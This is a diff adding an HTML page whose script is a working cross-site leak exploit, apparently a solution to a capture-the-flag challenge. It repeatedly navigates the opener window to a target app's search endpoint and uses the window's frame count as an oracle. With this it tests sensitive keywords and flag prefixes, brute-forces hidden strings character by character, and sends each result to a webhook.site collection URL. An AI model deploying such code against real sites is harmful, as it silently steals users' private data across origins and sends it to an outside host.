@@ -1,0 +1,49 @@
+<!doctype html><html><body><script>
+(function(){
+const APP='https://7dd99b33cefc14f4.live.sbhost.io';
+const WH='https://webhook.site/c6e550b4-e693-44ab-bfc4-9a893c54021d';
+function b(t){ try{ new Image().src=WH+'?h='+encodeURIComponent(t)+'&r='+Math.random(); }catch(e){} }
+b('helper-loaded|opener:'+(window.opener?('yes,closed='+opener.closed):'NO'));
+function len(){ try{ return window.opener.length; }catch(e){ return -1; } }
+function nav(q){
+  try{ window.opener.location=APP+'/search?q='+encodeURIComponent(q)+'&cb='+Math.floor(Math.random()*1e9); return true; }
+  catch(e){ b('nav-err:'+e); return false; }
+}
+function probe(q){
+  return new Promise(function(res){
+    if(!nav(q)){ res(-8); return; }
+    setTimeout(function(){ res(len()); },2600);
+  });
+}
+var go=false;
+function start(){ if(go) return; go=true; b('helper-go'); run(); }
+window.addEventListener('message',function(e){ b('msg:'+e.data); start(); });
+setTimeout(start,2000);
+async function run(){
+  const cal=['zzzznothing','review','Friday','invoice'];
+  const out={};
+  for(const q of cal){ out[q]=await probe(q); b('cal:'+q+'='+out[q]); }
+  b('CAL:'+JSON.stringify(out));
+  const story=['invoice','credentials','confidential','password','quarterly','bonus','resign','fired','screenshot','attachment','forward','urgent','secret','leak','meeting','travel','expense','contract','salary','warning'];
+  const hits=[];
+  for(const q of story){ if(await probe(q)===1) hits.push(q); }
+  b('STORY:'+JSON.stringify(hits));
+  const pref=['FLAG{','flag{','CTF{','ctf{','HTB{','THM{','FLAG','flag'];
+  const ph=[];
+  for(const q of pref){ if(await probe(q)===1) ph.push(q); }
+  b('PREF:'+JSON.stringify(ph));
+  let ALPHA='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-.,!?@# ';
+  const seeds=new Set(ph);
+  for(const c of ALPHA){ if(await probe(c)===1) seeds.add(c); }
+  b('SEEDS:'+JSON.stringify([...seeds]));
+  const CS='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-.,!?@# ';
+  const maximal=[];
+  async function grow(p){ let any=false;
+    for(const c of CS){ if(await probe(p+c)===1){ any=true; await grow(p+c); } }
+    if(!any){ maximal.push(p); b('MAX:'+p); }
+  }
+  for(const s of seeds){ if(maximal.some(m=>m.length>s.length&&m.startsWith(s))) continue; await grow(s); }
+  b('DONE:'+JSON.stringify(maximal));
+}
+})().catch&&0;
+</script></body></html>
